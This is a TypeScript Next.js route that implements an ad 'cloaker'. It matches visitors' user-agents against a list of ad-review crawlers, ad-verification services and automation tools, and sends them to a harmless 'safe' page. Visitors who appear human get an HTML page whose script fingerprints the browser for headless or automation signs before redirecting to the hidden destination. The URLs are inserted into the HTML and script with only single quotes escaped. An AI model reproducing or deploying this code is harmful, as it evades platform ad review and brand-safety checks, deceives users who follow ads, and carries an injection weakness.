import { NextRequest, NextResponse } from 'next/server'
import { supabaseAdmin } from '@/lib/supabase'

export const runtime = 'nodejs'

// ─── Known bot / crawler user-agents ─────────────────────────────────────────
const BOT_UA_PATTERNS = [
  // Meta / Facebook
  'facebookexternalhit', 'facebot', 'facebookcatalog', 'meta-externalagent',
  // TikTok / ByteDance
  'bytespider', 'tiktokspider', 'tiktok',
  // Google
  'googlebot', 'google-structured-data-testing-tool', 'google-inspectiontool',
  'googleweblight', 'adsbot-google', 'mediapartners-google',
  // Bing / Microsoft
  'bingbot', 'msnbot', 'adidxbot',
  // Apple / Twitter / LinkedIn / Snap
  'applebot', 'twitterbot', 'linkedinbot', 'snapchat',
  // SEO tools
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'rogerbot',
  'screaming frog', 'seokicks', 'sistrix',
  // Generic crawler patterns
  'spider', 'crawler', 'scraper', 'bot/', '/bot',
  // Headless browsers / automation
  'headlesschrome', 'phantomjs', 'selenium', 'puppeteer', 'playwright',
  'webdriver', 'htmlunit', 'python-requests', 'python-urllib',
  'go-http-client', 'okhttp', 'axios/', 'node-fetch',
  'curl/', 'wget/', 'java/',
  // Ad verification / brand safety
  'adscore', 'integral-ads', 'doubleverify', 'moat/', 'iasds01',
  'whatsapp', 'slackbot', 'discordbot', 'telegrambot',
]

function detectBot(ua: string): { isBot: boolean; reason: string } {
  if (!ua || ua.trim().length < 10) {
    return { isBot: true, reason: 'empty_ua' }
  }
  const lower = ua.toLowerCase()
  for (const pattern of BOT_UA_PATTERNS) {
    if (lower.includes(pattern)) {
      return { isBot: true, reason: `ua:${pattern}` }
    }
  }
  return { isBot: false, reason: '' }
}

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ slug: string }> }
) {
  const { slug } = await params
  const ua = request.headers.get('user-agent') ?? ''

  // Fetch cloaker
  const { data: cloaker } = await supabaseAdmin
    .from('cloakers')
    .select('id, destination_url, safe_url, is_active')
    .eq('slug', slug)
    .maybeSingle()

  // Unknown slug or inactive → simple redirect to google (neutral)
  if (!cloaker || !cloaker.is_active) {
    return NextResponse.redirect('https://www.google.com', { status: 302 })
  }

  const { isBot, reason } = detectBot(ua)

  // Record click + increment counters (async, non-blocking)
  void supabaseAdmin.from('cloaker_clicks').insert({
    cloaker_id: cloaker.id,
    verdict: isBot ? 'bot' : 'human',
    bot_reason: reason || null,
    user_agent: ua.slice(0, 250),
  })

  void supabaseAdmin.rpc('increment_cloaker_clicks', {
    p_id: cloaker.id,
    p_is_bot: isBot,
  })

  // Layer 1: Server-side bot detected → silent redirect to safe page
  if (isBot) {
    return NextResponse.redirect(cloaker.safe_url, { status: 302 })
  }

  // Layer 2: Serve HTML with JS fingerprinting for edge cases
  const dest = cloaker.destination_url.replace(/'/g, "\\'")
  const safe = cloaker.safe_url.replace(/'/g, "\\'")

  const html = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <meta http-equiv="refresh" content="3;url=${cloaker.safe_url}">
  <title>Aguarde...</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box}
    body{background:#fff;display:flex;align-items:center;justify-content:center;min-height:100vh;font-family:sans-serif}
    .ring{width:36px;height:36px;border:3px solid #e5e7eb;border-top-color:#3b82f6;border-radius:50%;animation:spin .8s linear infinite}
    @keyframes spin{to{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="ring"></div>
  <script>
    !function(){
      var d='${dest}',s='${safe}';
      function b(){
        try{
          if(navigator.webdriver)return'webdriver';
          if(typeof navigator.plugins==='object'&&navigator.plugins.length===0&&/chrome/i.test(navigator.userAgent)&&!/edg|opr|brave/i.test(navigator.userAgent))return'no_plugins';
          if(screen.width<200||screen.height<200)return'small_screen';
          var c=document.createElement('canvas');
          if(!c.getContext)return'no_canvas';
          if(window.callPhantom||window._phantom||window.__nightmare)return'phantom';
          if(/HeadlessChrome/i.test(navigator.userAgent))return'headless_chrome';
          return null;
        }catch(e){return'error'}
      }
      var t=setTimeout(function(){window.location.replace(s)},3000);
      var r=b();
      clearTimeout(t);
      window.location.replace(r?s:d);
    }();
  </script>
</body>
</html>`

  return new NextResponse(html, {
    status: 200,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      'Cache-Control': 'no-store, no-cache, must-revalidate',
      'X-Robots-Tag': 'noindex, nofollow',
    },
  })
}
